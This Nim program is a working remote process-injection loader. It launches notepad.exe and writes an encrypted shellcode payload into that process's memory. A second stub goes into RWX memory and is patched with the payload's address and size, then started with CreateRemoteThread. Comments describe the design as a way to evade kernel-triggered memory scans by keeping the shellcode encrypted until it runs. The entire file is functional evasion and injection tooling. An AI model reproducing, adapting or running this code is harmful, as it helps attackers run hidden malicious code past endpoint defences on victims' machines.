import winim
import dynlib

const shellcode = slurp"messageenc.bin"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var remoteProcID: DWORD
var tProcess: HANDLE
var tHandle: HANDLE

proc StartProcess(): void =
    var 
        lpSize: SIZE_T
        pi: PROCESS_INFORMATION
        ps: SECURITY_ATTRIBUTES
        si: STARTUPINFOEX
        status: WINBOOL
        tProcPath: WideCString
        ts: SECURITY_ATTRIBUTES
    
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint
    si.StartupInfo.cb = sizeof(si).cint


    tProcPath = newWideCString(r"C:\windows\system32\notepad.exe")

    status = CreateProcess(
        NULL,
        cast[LPWSTR](tProcPath),
        ps,
        ts, 
        FALSE,
        CREATE_NEW_CONSOLE or EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        r"C:\Windows\system32\",
        addr si.StartupInfo,
        addr pi)

    tProcess = pi.hProcess
    remoteProcID = pi.dwProcessId
    tHandle = pi.hThread
StartProcess()

Sleep(1000)

echo "-------------------------------------------------------------------"
echo "[*] Target Process: ", remoteProcID

var shellcodeBytes: seq[byte] = toByteSeq(shellcode)

var rPtr: LPVOID

echo "[*] pHandle: ", tProcess

var sc_size: SIZE_T = cast[SIZE_T](shellcodeBytes.len)

# Use VirtualAllocEx to allocate memory in the remote process

rptr = VirtualAllocEx(
    tProcess,
    NULL,
    SIZE_T(sc_size),
    MEM_COMMIT,
    PAGE_READWRITE)


echo "[*] Writing shellcode into remote process memory: ", repr(rPtr)

var bytesWritten: SIZE_T

# Use WriteProcessMemory to write the shellcode into the allocated memory

var
    status: WINBOOL

status = WriteProcessMemory(
        tProcess, 
        rPtr, 
        unsafeAddr shellcodeBytes[0], 
        sc_size, 
        addr bytesWritten);

if (status == 1):
    echo "[+] WriteProcessMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""
else:
    echo "[-] WriteProcessMemory failed!"
    quit(1)

echo "[*] Encrypted shellcode was written into the remote process!"
echo "-------------------------------------------------------------"

# Afterwards, we also inject decryptprotect.bin

const hookShellcode = slurp"decryptprotect.bin"

var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

var sc_size2: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)

var rPtr2: LPVOID

echo  "[*] Allocating memory for our custom shellcode, which will decrypt and re-protect"

rPtr2 = VirtualAllocEx(
    tProcess,
    NULL,
    sc_size2,
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE)


if(rPtr2 != nil):
    echo "[+] VirtualAllocEx success!"
    echo "[*] Second Shellcode will be written to: ", repr(rPtr2)
else:
    echo "[-] VirtualAllocEx failed!"
    quit(1)

# The shellcode contains two eggs, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88 and 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x41, 0xFF, 0xE2. Now we want to replace the first egg with the value of
# the newly allocated memory address rptr, and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address

var eggIndex = 0

echo "-------------------------------------------------------------"
echo "[*] Looking for the egg, which will be filled with the first shellcodes memory address"

for i in 0 ..< hookShellcodeBytes.len:
    if (hookShellcodeBytes[i] == 0x88) and (hookShellcodeBytes[i+1] == 0x88) and (hookShellcodeBytes[i+2] == 0x88) and (hookShellcodeBytes[i+3] == 0x88) and (hookShellcodeBytes[i+4] == 0x88) and (hookShellcodeBytes[i+5] == 0x88):
        echo "[*] Found egg at index: ", i
        eggIndex = i
        break

echo "[*] Writing allocated memory address into egg"

copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr rPtr, 8)

echo "[*] Done."

# and we also want to replace the 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 with the address of the newly allocated memory address


echo "-------------------------------------------------------------"
echo "[*] Looking for the second egg, which will be filled the same address but to jump there at the end"

eggIndex = 0

for i in 0 ..< hookShellcodeBytes.len:
    if (hookShellcodeBytes[i] == 0x49) and (hookShellcodeBytes[i+1] == 0xBA) and (hookShellcodeBytes[i+2] == 0x00) and (hookShellcodeBytes[i+3] == 0x00) and (hookShellcodeBytes[i+4] == 0x00) and (hookShellcodeBytes[i+5] == 0x00) and (hookShellcodeBytes[i+6] == 0x00) and (hookShellcodeBytes[i+7] == 0x00) and (hookShellcodeBytes[i+8] == 0x00) and (hookShellcodeBytes[i+9] == 0x00) and (hookShellcodeBytes[i+10] == 0x41) and (hookShellcodeBytes[i+11] == 0xFF) and (hookShellcodeBytes[i+12] == 0xE2):
        echo "[*] Found egg at index: ", i
        # our 0x00 bytes start at position three, so we need to add three to the index
        eggIndex = i + 2
        break

echo "[*] Writing memory address into the jump at the end"

copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr rPtr, 8)

# There is another egg, 0xDE, 0xAD, 0x10, 0xAF - which we want to find and replace with the length of the first shellcode (calc64enc.bin)

eggIndex = 0

echo "-------------------------------------------------------------"
echo "[*] Looking for the third egg, which will be filled with the shellcodes size"

for i in 0 ..< hookShellcodeBytes.len:
    if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0x10) and (hookShellcodeBytes[i+3] == 0xAF):
        echo "[*] Found egg at index: ", i
        eggIndex = i
        break

echo "[*] Writing shellcode length into egg: ", shellcodeBytes.len

var shellcodeSize: DWORD = cast[DWORD](shellcodeBytes.len)

copyMem(unsafeAddr hookShellcodeBytes[eggIndex], unsafeAddr shellcodeSize, 4)

# Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes

if(rPtr != nil):
    echo "[+] Successfully allocated remote process memory for the custom shellcode"
else:
    echo "[-] Memory allocation for remote process failed!"
    quit(1)

echo "-------------------------------------------------------------------"
Sleep(1000)


# Finally write the decryptprotect.bin shellcode into the remote process

status = WriteProcessMemory(
        tProcess, 
        rPtr2, 
        unsafeAddr hookShellcodeBytes[0], 
        sc_size2, 
        addr bytesWritten);


if (status == 1):
    echo "[+] WriteProcessMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""
else:
    echo "[-] WriteProcessMemory failed!"
    quit(1)

####################################################################

# Afterwards we execute the decryptprotect.bin Shellcode with CreateRemoteThread, which may lead to a kernel triggered memory scan,
# which won't find the shellcode, because it is still encrypted in a different RW section.

echo "-------------------------------------------------------------------"
Sleep(1000)

echo "[*] Creating remote Thread for the second custom shellcode, which will sleep, decrypt and deprotect plus jump to the first one."

CreateRemoteThread(
    tProcess,
    NULL,
    0,
    cast[LPTHREAD_START_ROUTINE](rPtr2),
    NULL,
    0,
    NULL)
    